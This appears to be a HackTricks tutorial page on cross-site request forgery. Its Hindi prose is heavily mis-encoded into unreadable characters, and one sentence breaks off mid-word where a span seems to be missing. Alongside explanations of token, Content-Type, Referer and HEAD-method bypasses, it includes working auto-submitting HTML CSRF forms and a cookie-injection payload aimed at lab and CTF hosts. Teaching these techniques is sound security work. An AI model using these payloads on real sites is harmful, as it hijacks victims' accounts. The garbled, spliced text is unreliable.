# CSRF (рдХреНрд░реЙрд╕ рд╕рд╛рдЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлреЙрд░реНрдЬрд░реА)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдореЗрдВ рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣реЛрддреА рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдЗрдирд╛рдо рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдЗрдирд╛рдо рдЙрд╕ рдмрдЧ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдорд┐рд▓реЗрдЧрд╛ред

**Web3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЗрд╕рдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ web3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**Web3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддрд┐рд╕реНрдкрд░реНрдзрд╛ рд╕реВрдЪрдХрд╛рдВрдХ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## CSRF рдХреНрдпрд╛ рд╣реИ?

**рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлреЙрд░реНрдЬрд░реА** (рдЬрд┐рд╕реЗ CSRF рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдПрдХ рд╡реЗрдм рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдХрдЯ рд╣реИ рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдРрд╕реА рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╡реЗ рдХрд░рдирд╛ рдирд╣реАрдВ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**ред\
рдЗрд╕реЗ **рдПрдХ рд▓реЙрдЧ рдЗрди рдХрд┐рдП рд╣реБрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рдкреАрдбрд╝рд┐рдд рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдореЗрдВ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рджреБрд╖реНрдЯ JS рдХреЛрдб рдХреЛ **рдЪрд▓рд╛рдиреЗ**, рдлрд╝реЙрд░реНрдо рднреЗрдЬрдиреЗ рдпрд╛ "рдЫрд╡рд┐рдпреЛрдВ" рдХреЛ **рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ** рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ

CSRF рд╕рдВрдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдкрд╣рд▓реЗ **рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬрдирд╛** рд╣реЛрдЧрд╛ (рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ рдИрдореЗрд▓ рдмрджрд▓реЗрдВ, рдкреАрдбрд╝рд┐рдд рдХреЛ рд╕реЛрд╢рд▓ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЖрдкрдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рдиреЗ рджреЗрдВ, рдЖрдкрдХреЛ рдЕрдзрд┐рдХ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдВ...)ред **рд╕рддреНрд░ рдХреЗрд╡рд▓ рдХреБрдХреАрдЬрд╝ рдпрд╛ HTTP рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реИрдбрд░ рдкрд░ рдирд┐рд░реНрднрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**, рдХрд┐рд╕реА рдЕрдиреНрдп рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рддреНрд░ рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдФрд░ рдЕрдВрдд рдореЗрдВ, рдЕрдиреБрд░реЛрдз рдкрд░ **рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред

рдЗрд╕ рд╕рдВрдХрдЯ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ **рд╕рдВрд░рдХреНрд╖рдг рдЙрдкрд╛рдп** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

### **рд╕рд╛рдорд╛рдиреНрдп рд╕рдВрд░рдХреНрд╖рдг**

* [**SameSite рдХреБрдХреАрдЬрд╝**](hacking-with-cookies/#samesite): рдпрджрд┐ рд╕рддреНрд░ рдХреБрдХреА рдЗрд╕ рдлрд╝реНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ, рддреЛ рдЖрдк рдпрд╛рддреНрд░реА рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдХреБрдХреА рднреЗрдЬрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ рд╣
### рдХрд╕реНрдЯрдо рд╣реЗрдбрд░ рдЯреЛрдХрди рдмрд╛рдИрдкрд╛рд╕

рдпрджрд┐ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ **рдХрд╕реНрдЯрдо рд╣реЗрдбрд░** рдФрд░ рдПрдХ **рдЯреЛрдХрди** рдХреЗ рд╕рд╛рде рдПрдХ **CSRF рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдзрд┐** рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдЯреЛрдХрди рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ:

* **рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдЯреЛрдХрди рдФрд░ рд╣реЗрдбрд░ рдХреЗ рдмрд┐рдирд╛** рдЕрдиреБрд░реЛрдз рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВред
* рдЙрд╕реА **рд▓рдВрдмрд╛рдИ рд╡рд╛рд▓реЗ рд▓реЗрдХрд┐рди рдЕрд▓рдЧ рдЯреЛрдХрди** рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВред

### CSRF рдЯреЛрдХрди рдХреБрдХреА рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

рдкрд┐рдЫрд▓реА рдХрдордЬреЛрд░реА рдХреЗ рдПрдХ рдФрд░ рд░реВрдкрд░реЗрдЦрд╛ рдореЗрдВ, рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рдкреНрд░рддреНрдпреЗрдХ рдЯреЛрдХрди рдХреЛ рдПрдХ рдХреБрдХреА рдФрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ**ред рдпрд╛ рд╡реЗ **рдПрдХ csrf рдХреБрдХреА рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ **рдмреИрдХрдПрдВрдб рдореЗрдВ рдЬрд╛рдВрдЪрддреЗ рд╣реИрдВ рдХрд┐ csrf рдЯреЛрдХрди рдЬреЛ рднреЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ, рдХреБрдХреА рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЯреЛрдХрди рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред

рдЬрдм рдЖрдЧрд╛рдореА рдЕрдиреБрд░реЛрдз рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрд╕ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдЕрдиреБрд░реЛрдз рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд┐рдП рдЧрдП рдЯреЛрдХрди** рдХрд╛ рдорд╛рди **рдХреБрдХреА** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдорд╛рди рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред\
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рд╕реЗ CSRF **рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ рдЙрд╕реЗ рдЕрдкрдиреЗ CSRF рдХреБрдХреА рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрдИ рдХрдордЬреЛрд░реА рд╣реЛ**ред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдк рдПрдХ рдирдХрд▓реА рдЫрд╡рд┐ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдХреЗ рдХреБрдХреА рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ CSRF рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ **csrf рдЯреЛрдХрди рд╕рддреНрд░ рдХреБрдХреА рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рддреЛ рдпрд╣ рд╣рдорд▓рд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЛ рдЕрдкрдирд╛ рд╕рддреНрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдФрд░ рдЗрд╕рд▓рд┐рдП рдЖрдк рдЦреБрдж рдХреЛ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реЛрдВрдЧреЗред
{% endhint %}

### Content-Type рдмрджрд▓реЗрдВ

[**рдЗрд╕**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) рдХреЗ рдЕрдиреБрд╕рд╛рд░, **рдкреНрд░реАрдлреНрд▓рд╛рдЗрдЯ** рдЕрдиреБрд░реЛрдзреЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП **POST** рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдпреЗ Content-Type рдорд╛рдиреНрдп рд╣реИрдВ:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рд╕рд░реНрд╡рд░ рдХреА рддрд░реНрдХ рд╕рдВрд░рдЪрдирд╛ рднрд┐рдиреНрди рд╣реЛ рд╕рдХрддреА рд╣реИ** рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдорд╛рдиреНрдпрддрд╛рдУрдВ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдЕрдиреНрдп рдорд╛рдиреЛрдВ рдЬреИрд╕реЗ **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЙрджрд╛рд╣рд░рдг (рдпрд╣рд╛рдВ рд╕реЗ [рдпрд╣рд╛рдВ](https://brycec.me/posts/corctf\_2021\_challenges) рд╕реЗ) text/plain рдХреЗ рд░реВрдк рдореЗрдВ JSON рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рдХрд╛:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### рдПрдкреНрд▓рд┐рдХреЗрд╢рди/json рдкреНрд░реАрдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рдмрд╛рдИрдкрд╛рд╕

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рдЬрд╛рдирддреЗ рд╣реИрдВ, рдЖрдк HTML рдлреЙрд░реНрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Content-Type **`application/json`** рдХреЗ рд╕рд╛рде POST рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдЖрдк рдРрд╕рд╛ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рддреЛ **`XMLHttpRequest`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рд▓реЗ рдПрдХ **рдкреНрд░реАрдлреНрд▓рд╛рдЗрдЯ** рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк `text/plain` рдФрд░ `application/x-www-form-urlencoded` рдЬреИрд╕реЗ content types рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ JSON рдбреЗрдЯрд╛ рднреЗрдЬреЗрдВ рддрд╛рдХрд┐ рдкреАрдЫреЗ рдХреА рддрд░рдл рд╕реЗ Content-Type рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдмреИрдХрдПрдВрдб рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред\
рдЖрдк `Content-Type: text/plain` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлреЙрд░реНрдо рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **`enctype="text/plain"`** рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рд╕рд░реНрд╡рд░ рдХреЗрд╡рд▓ "application/json" content type рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **"text/plain; application/json" content type** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдкреНрд░реАрдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

рдЖрдк рдПрдХ **SWF рдлреНрд▓реИрд╢ рдлрд╝рд╛рдЗрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рднреА **рдмрд╛рдИрдкрд╛рд╕** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ред

### рд░реЗрдлрд░рд░ / рдЙрддреНрдкрддреНрддрд┐ рдЬрд╛рдВрдЪ рдмрд╛рдИрдкрд╛рд╕

**рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рд╕реЗ рдмрдЪреЗрдВ**

рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рдХреА рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рд╡рд╣ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди **рдпрджрд┐ рд╣реЗрдбрд░ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдЫреВрдЯ рджреЗрддреЗ рд╣реИрдВ**ред
```markup
<meta name="referrer" content="never">
```
**Regexp рдмрд╛рдИрдкрд╛рд╕**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рднреАрддрд░ рд░реЗрдлрд░рд░ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ URL рдореЗрдВ рд╕рд░реНрд╡рд░ рдХрд╛ рдбреЛрдореЗрди рдирд╛рдо рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD рд╡рд┐рдзрд┐ рдмрд╛рдИрдкрд╛рд╕**

[**рдЗрд╕ CTF рд╡реНрд░рд╛рдЗрдЯрдЕрдк**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) рдХрд╛ рдкрд╣рд▓рд╛ рд╣рд┐рд╕реНрд╕рд╛ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ [Oak рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб](https://github.com/oakserver/oak/blob/main/router.ts#L281) рдореЗрдВ, рдПрдХ рд░рд╛рдЙрдЯрд░ **HEAD рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ GET рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** - рдпрд╣ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрд╛рдп рд╣реИ рдЬреЛ Oak рдХреЗ рд▓рд┐рдП рдЕрджреНрд╡рд┐рддреАрдп рдирд╣реАрдВ рд╣реИред HEAD рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╣реИрдВрдбрд▓рд░ рдХреА рдмрдЬрд╛рдп, рд╡реЗ рд╕рд┐рд░реНрдл **GET рд╣реИрдВрдбрд▓рд░ рдХреЛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдРрдк рд╕рд┐рд░реНрдл рдЙрддреНрддрд░ рдмреЙрдбреА рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ**ред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдПрдХ GET рдЕрдиреБрд░реЛрдз рдХреА рд╕реАрдорд╛ рд╣реЛ рд░рд╣реА рд╣реИ, рддреЛ рдЖрдк рд╕рд┐рд░реНрдл **рдПрдХ HEAD рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ GET рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рд╣реЛрдЧрд╛**ред

## **рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг**

### **CSRF рдЯреЛрдХрди рдХреЛ рдирд┐рдХрд╛рд▓рдирд╛**

